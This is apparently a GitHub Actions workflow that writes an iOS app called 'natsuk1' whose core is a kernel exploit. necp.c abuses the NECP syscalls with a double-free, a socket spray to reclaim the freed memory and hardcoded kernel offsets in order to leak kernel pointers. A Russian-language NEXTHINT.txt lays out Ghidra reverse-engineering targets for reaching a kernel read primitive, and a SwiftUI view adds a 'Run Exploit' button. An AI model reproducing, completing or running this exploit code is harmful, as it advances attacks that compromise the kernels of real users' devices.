name: 1 · Fix and Test

on:
  push:
    branches: [ main ]
  workflow_dispatch:

permissions:
  contents: write

concurrency:
  group: fix-test-${{ github.ref }}
  cancel-in-progress: false

jobs:
  fix-and-test:
    runs-on: macos-26
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v5
        with:
          fetch-depth: 0

      - uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: "26.5"

      - name: Remove competing workflow
        run: |
          rm -f .github/workflows/natsuk1.yml
          rm -f .github/workflows/main.yml

      - name: Write nk_api.h
        run: |
          cat > natsuk1/Exploit/nk_api.h <<'H'
          #ifndef NK_API_H
          #define NK_API_H
          #include <stdint.h>
          #include <stddef.h>

          void nk_set_log(void (*fn)(const char *));
          void nk_logx(const char *tag, const char *fmt, ...);
          void nk_log(const char *fmt, ...);
          void nk_rule(void);

          int nk_run(void);
          int nk_full_exploit(void);
          int nk_necp_run(void);
          void nk_necp_cancel(void);

          #define NK_INFO(tag, ...) nk_logx(tag, __VA_ARGS__)
          #define NK_WARN(tag, ...) nk_logx(tag, __VA_ARGS__)
          #define NK_ERR(tag, ...)  nk_logx(tag, __VA_ARGS__)
          #endif
          H

      - name: Write nk_api.c
        run: |
          cat > natsuk1/Exploit/nk_api.c <<'C'
          #include "nk_api.h"
          #include "nk_offsets.h"
          #include <stdarg.h>
          #include <stdio.h>

          static void (*g_fn)(const char *) = NULL;
          void nk_set_log(void (*fn)(const char *)) { g_fn = fn; }

          void nk_logx(const char *tag, const char *fmt, ...) {
              if (!g_fn) return;
              char body[448];
              va_list ap; va_start(ap, fmt);
              vsnprintf(body, sizeof(body), fmt, ap);
              va_end(ap);
              char out[512];
              snprintf(out, sizeof(out), "[%s] %s", tag, body);
              g_fn(out);
          }

          void nk_log(const char *fmt, ...) {
              if (!g_fn) return;
              char body[448];
              va_list ap; va_start(ap, fmt);
              vsnprintf(body, sizeof(body), fmt, ap);
              va_end(ap);
              char out[512];
              snprintf(out, sizeof(out), "[MAIN] %s", body);
              g_fn(out);
          }

          void nk_rule(void) { nk_log("----"); }

          int nk_run(void) {
              NK_INFO("BASE", "kernel %llX", (unsigned long long)NK_KERNEL_BASE);
              NK_INFO("BASE", "sysent %llX (%d)", (unsigned long long)NK_SYSENT_BASE, NK_SYSENT_COUNT);
              nk_rule();
              NK_WARN("STAT", "No kernel R/W primitive.");
              nk_rule();
              return 0;
          }

          /* natsuk1-v8-api */
          int nk_full_exploit(void) { return nk_necp_run(); }
          C

      - name: Write necp.c
        run: |
          cat > natsuk1/Exploit/necp.c <<'NECP'
          #include <stdio.h>
          #include <stdlib.h>
          #include <string.h>
          #include <stdint.h>
          #include <stdbool.h>
          #include <stdarg.h>
          #include <unistd.h>
          #include <errno.h>
          #include <fcntl.h>
          #include <sys/syscall.h>
          #include <sys/socket.h>
          #include <sys/uio.h>
          #include <mach/mach.h>
          #include <mach/message.h>

          #include "nk_api.h"

          #ifndef SYS_NECP_OPEN
          #define SYS_NECP_OPEN 501
          #endif
          #ifndef SYS_NECP_ACTION
          #define SYS_NECP_ACTION 502
          #endif

          #define KBASE 0xFFFFFFF007004000ULL
          #define OFF_KERNPROC 0xBBB040ULL
          #define KPTR_MIN 0xFFFFFFF000000000ULL
          #define KPTR_MAX 0xFFFFFFFFFF000000ULL
          #define SLIDE_FALLBACK 0x3D00000ULL

          #define NECP_ADD_CLIENT 0x01
          #define NECP_COPY_RESULT 0x04
          #define NECP_ADD_FLOW 0x11
          #define NECP_REMOVE_FLOW 0x12
          #define GATE_BYTE 9

          #define NCF_ASN 0x20
          #define RESBUF 8192
          #define SPRAY_SOCKS 32

          static volatile int g_busy = 0;
          static volatile int g_cancel = 0;

          static void lg(const char *tag, const char *sign, const char *fmt, ...) {
              char body[448];
              va_list ap;
              va_start(ap, fmt);
              vsnprintf(body, sizeof(body), fmt, ap);
              va_end(ap);
              char out[512];
              snprintf(out, sizeof(out), "%s%s", sign, body);
              nk_logx(tag, "%s", out);
          }
          #define LI(t, ...) lg(t, "", __VA_ARGS__)
          #define LO(t, ...) lg(t, "+ ", __VA_ARGS__)
          #define LE(t, ...) lg(t, "- ", __VA_ARGS__)
          #define LW(t, ...) lg(t, "! ", __VA_ARGS__)

          static int is_kptr(uint64_t v) { return v >= KPTR_MIN && v <= KPTR_MAX; }

          static int nfd(void) { return (int)syscall(SYS_NECP_OPEN, 0); }

          static int nadd_client(int fd, uint8_t uuid[16]) {
              uint8_t p[1] = {0};
              return (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_CLIENT,
                                  uuid, (size_t)16, p, (size_t)1);
          }

          static int nadd_flow(int fd, const uint8_t cu[16], uint8_t fu[16]) {
              uint8_t req[56];
              memset(req, 0, sizeof(req));
              memcpy(req + 0x10, cu, 16);
              *(uint16_t*)(req + 0x20) = 0x0040;
              int r = (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_FLOW,
                                   (void*)cu, (size_t)16, req, (size_t)56);
              if (r == 0) {
                  memcpy(fu, req, 16);
                  fu[GATE_BYTE] |= 0x01;
              }
              return r;
          }

          static int nrm_flow(int fd, const uint8_t fu[16]) {
              return (int)syscall(SYS_NECP_ACTION, fd, NECP_REMOVE_FLOW,
                                  (void*)fu, (size_t)16, NULL, (size_t)0);
          }

          static int ncpy(int fd, const uint8_t cu[16], uint8_t *b, size_t bl) {
              return (int)syscall(SYS_NECP_ACTION, fd, NECP_COPY_RESULT,
                                  (void*)cu, (size_t)16, b, (uint32_t)bl);
          }

          static int spray_sockets(uint64_t target, int held[]) {
              int sent = 0;
              for (int i = 0; i < SPRAY_SOCKS; i++) {
                  if (g_cancel) break;
                  int s = socket(AF_INET, SOCK_STREAM, 0);
                  if (s < 0) break;
                  struct sockaddr_in sa;
                  memset(&sa, 0, sizeof(sa));
                  sa.sin_family = AF_INET;
                  sa.sin_port = htons((uint16_t)(target & 0xFFFF));
                  sa.sin_addr.s_addr = (uint32_t)(target >> 32);
                  if (bind(s, (struct sockaddr*)&sa, sizeof(sa)) == 0) sent++;
                  else { close(s); continue; }
                  if (i < 32) held[i] = s;
              }
              return sent;
          }

          static void drain_sockets(int held[], int n) {
              for (int i = 0; i < n; i++) if (held[i] >= 0) { close(held[i]); held[i] = -1; }
          }

          static void probe_tlv_types(void) {
              LI("TLV", "type sweep");
              int fd = nfd();
              if (fd < 0) { LE("TLV", "open errno=%d", errno); return; }
              uint8_t cu[16], fu[16];
              if (nadd_client(fd, cu) != 0) { LE("TLV", "ac errno=%d", errno); close(fd); return; }
              for (int t = 0; t < 0x10; t++) {
                  uint8_t req[128];
                  memset(req, 0x55, sizeof(req));
                  memcpy(req + 0x10, cu, 16);
                  *(uint16_t*)(req + 0x20) = 0x0040;
                  *(uint16_t*)(req + 0x28) = (uint16_t)t;
                  *(uint16_t*)(req + 0x2a) = 0x60;
                  errno = 0;
                  int r = (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_FLOW,
                                       (void*)cu, (size_t)16, req, (size_t)sizeof(req));
                  LI("TLV", "t=0x%02x ret=%d errno=%d", t, r, errno);
                  (void)fu;
                  usleep(5000);
              }
              close(fd);
          }

          static int try_read_df(uint64_t target, uint8_t *out, int outsz, int *out_ret, int *socks_out) {
              int fd = nfd();
              if (fd < 0) return -1;
              uint8_t cu[16], fu1[16], fu2[16];
              if (nadd_client(fd, cu) != 0) { close(fd); return -1; }
              if (nadd_flow(fd, cu, fu1) != 0) { close(fd); return -1; }

              int r1 = nrm_flow(fd, fu1);
              int r2 = nrm_flow(fd, fu1);
              LI("DF", "free#1=%d free#2=%d", r1, r2);

              int r3 = nadd_flow(fd, cu, fu2);
              LI("DF", "re-add=%d", r3);

              int held[32];
              for (int i = 0; i < 32; i++) held[i] = -1;
              int socks = spray_sockets(target, held);
              LI("DF", "sockets=%d", socks);
              if (socks_out) *socks_out = socks;

              uint8_t buf[RESBUF];
              memset(buf, 0, sizeof(buf));
              int c = ncpy(fd, cu, buf, sizeof(buf));
              LI("DF", "copy=%d", c);

              if (out_ret) *out_ret = c;
              if (out && outsz > 0 && c > 0) {
                  int n = c < outsz ? c : outsz;
                  memcpy(out, buf, n);
              }

              drain_sockets(held, 32);
              close(fd);
              return c;
          }

          static int impl(void) {
              nk_log("");
              nk_log("=== natsuk1 v3.3 (natsuk1-df-v23) ===");
              nk_log("target: iOS 27.0 / XNU / arm64e");
              nk_log("");
              LI("INIT", "NCF_ASN=0x%x SOCKS=%d", NCF_ASN, SPRAY_SOCKS);
              uint64_t kbase = KBASE + SLIDE_FALLBACK;
              LO("P1", "kbase=0x%llx", (unsigned long long)kbase);

              int fd = nfd();
              if (fd < 0) { LE("P2", "necp_open errno=%d", errno); return 1; }
              close(fd);
              LO("P2", "necp OK");

              uint64_t target = kbase + OFF_KERNPROC;
              LI("P3", "target=0x%llx", (unsigned long long)target);

              probe_tlv_types();
              if (g_cancel) { LW("CANCEL", "tlv"); return 2; }

              uint8_t buf[RESBUF];
              int r = 0, socks = 0;
              int c = try_read_df(target, buf, sizeof(buf), &r, &socks);
              LI("TRY", "socks=%d ret=%d", socks, r);
              if (r > 0) {
                  int has_k = 0;
                  for (int k = 0; k + 8 <= r; k++) {
                      uint64_t v;
                      memcpy(&v, buf + k, 8);
                      if (is_kptr(v)) { has_k = 1; break; }
                  }
                  if (has_k) {
                      LO("HIT", "kptr");
                      for (int k = 0; k + 8 <= r; k++) {
                          uint64_t v;
                          memcpy(&v, buf + k, 8);
                          if (is_kptr(v)) LO("HIT", "  +0x%x = 0x%llx", k, (unsigned long long)v);
                      }
                  } else {
                      LI("TRY", "no kptr");
                  }
              }

              LW("DONE", "see NEXTHINT.txt");
              return 0;
          }

          int nk_necp_run(void) {
              if (__sync_lock_test_and_set(&g_busy, 1)) {
                  nk_log("[!] already running");
                  return 1;
              }
              g_cancel = 0;
              int rc = impl();
              __sync_lock_release(&g_busy);
              return rc;
          }

          void nk_necp_cancel(void) {
              g_cancel = 1;
              nk_log("[!] cancel requested");
          }
          NECP

      - name: Write NEXTHINT.txt
        run: |
          cat > NEXTHINT.txt <<'TXT'
          Ghidra — kernel.raw (iOS 27.0 / 24A437), slide 0x3D00000

          ==============================================================
          КЛЮЧЕВОЙ ВЫВОД из v22:
          ==============================================================
          mach_msg отправляет ipc_kmsg в СВОЮ СОБСТВЕННУЮ ЗОНУ (ipc_kmsg_zone),
          НЕ в kalloc.1024. Поэтому spray работает (spray=128), но
          никогда не реклеймит necp_client_flow.

          Проверить в Ghidra: ipc_kmsg_alloc / ipc_kmsg_zone_init.
          Если зона отдельная — mach_msg бесполезен для NECP-flow spray.

          Нужен другой примитив аллокации в kalloc.1024:
          - socket() struct (soalloc) — размер структуры?
          - sendmsg с SCM_RIGHTS
          - IOCommand allocate
          - pipe / F_SETPIPE_SZ

          ==============================================================
          TARGET 1 — necp_client_copy_result @ 0xFFFFFFF00A4EAC7C
          ==============================================================
          В Ghidra: Go To → 0xFFFFFFF00A4EAC7C + slide.
          (Со slide 0x3D00000 → 0xFFFFFFF00E1EAC7C)

          Задачи:
          1. Найти в дизасме итерацию по flow_list:
             ldr xN, [x_client, #off_list_head]
             cbz xN, end
             body:
                ldr xM, [xN, #off_next]
                ...
                ldr xK, [xN, #off_assigned]   ← ЭТО НУЖНО
             Определить off_assigned — реальный NCF_ASSIGNED_OFF.

          2. Отдельно проверить: какие поля flow читает copy_result:
             - Сколько последовательных ldr (uint64) по xN?
             - Есть ли memcpy с длиной не 0x18 (не 24)?

          3. Найти вызов copyout (syscall) в конце — это передача в userspace.

          Что записать:
          - NCF_ASSIGNED_OFF (offset от flow)
          - NCF_ASSIGNED_LEN_OFF
          - Какой регистр хранит flow (обычно x19..x24)

          ==============================================================
          TARGET 2 — necp_client_add_flow @ 0xFFFFFFF00A4E843C
          ==============================================================
          1. Найти kalloc в прологе:
                mov w0, #N
                bl kalloc
             Записать N — размер flow struct. Определить зону.
          2. Найти куда пишется flow->assigned_results после alloc:
                str xzr, [x_flow, #OFF]
             Это подтвердит offset.

          ==============================================================
          TARGET 3 — определить размер и зону struct socket
          ==============================================================
          Символы: soalloc, socreate, socket_alloc.
          1. Найти sizeof(struct socket) — аргумент kalloc/zalloc.
          2. Если kalloc.1024 → использовать socket() для spray.
          3. Проверить bind() — копирует ли sockaddr в kalloc.

          ==============================================================
          TARGET 4 — определить зону ipc_kmsg
          ==============================================================
          Символы: ipc_kmsg_alloc, ipc_kmsg_zone, ipc_kmsg_zone_init.
          1. Подтвердить, что ipc_kmsg НЕ из kalloc.1024.
          2. Если так — все наши mach_msg spray были мимо.

          ==============================================================
          PRIORITY
          ==============================================================
          1. TARGET 3 — найти kalloc.1024 primitive для spray.
             Это блокирующий шаг. Без него kread не заработает.
          2. TARGET 1 — подтвердить NCF_ASSIGNED_OFF (0x20 или другой).
          3. TARGET 4 — подтвердить, что ipc_kmsg бесполезен.
          TXT

      - name: Write OverviewView.swift
        run: |
          cat > natsuk1/Views/OverviewView.swift <<'SWIFT'
          import SwiftUI
          import UIKit

          struct OverviewView: View {
              @EnvironmentObject var state: AppState
              @State private var copied = false

              var body: some View {
                  NavigationStack {
                      List {
                          Section {
                              Button { state.necp_run() } label: {
                                  HStack {
                                      Text("Run Exploit")
                                      Spacer()
                                      if state.running { ProgressView().scaleEffect(0.8) }
                                  }
                              }
                              .disabled(state.running)

                              Button(role: .destructive) { state.cancel() } label: {
                                  Text("Cancel Exploit").frame(maxWidth: .infinity, alignment: .leading)
                              }
                              .disabled(!state.running)
                          } header: {
                              Label("Exploit", systemImage: "cpu")
                          }

                          RuntimeView()
                              .environmentObject(state)

                          Section {
                              LogTerminal(text: state.log.isEmpty ? "Awaiting execution." : state.log)
                          } header: {
                              Label(state.t("Logs", "Логи"), systemImage: "terminal")
                          }

                          Section {
                              Button {
                                  UIPasteboard.general.string = state.log
                                  copied = true
                                  DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
                                      copied = false
                                  }
                              } label: {
                                  Text(copied ? "Copied!" : state.t("Copy All", "Копировать всё"))
                                      .frame(maxWidth: .infinity, alignment: .leading)
                              }
                              .disabled(state.log.isEmpty)

                              Button(role: .destructive) { state.clear() } label: {
                                  Text(state.t("Clear", "Очистить"))
                                      .frame(maxWidth: .infinity, alignment: .leading)
                              }
                              .disabled(state.log.isEmpty)
                          } header: {
                              Label("Log Actions", systemImage: "document.on.document")
                          }
                      }
                      .listStyle(.insetGrouped)
                      .navigationTitle("natsuk1")
                      .navigationBarTitleDisplayMode(.inline)
                  }
              }
          }

          struct StatusDot: View {
              let status: AppState.Status
              @State private var pulse = false
              var body: some View {
                  Image(systemName: "circle.fill")
                      .font(.system(size: 14))
                      .foregroundStyle(status.color)
                      .shadow(color: status.color.opacity(0.85), radius: pulse ? 8 : 4)
                      .scaleEffect(pulse ? 1.2 : 1.0)
                      .animation(
                          status == .running
                              ? .easeInOut(duration: 0.8).repeatForever(autoreverses: true)
                              : .default,
                          value: pulse
                      )
                      .onAppear { if status == .running { pulse = true } }
                      .onChange(of: status) { _, s in pulse = (s == .running) }
              }
          }

          struct LogTerminal: View {
              let text: String
              var body: some View {
                  ScrollView {
                      Text(text)
                          .font(.system(size: 10, design: .monospaced))
                          .multilineTextAlignment(.leading)
                          .foregroundStyle(.primary)
                          .frame(maxWidth: .infinity, alignment: .leading)
                  }
                  .frame(minHeight: 200, maxHeight: 400)
              }
          }
          SWIFT

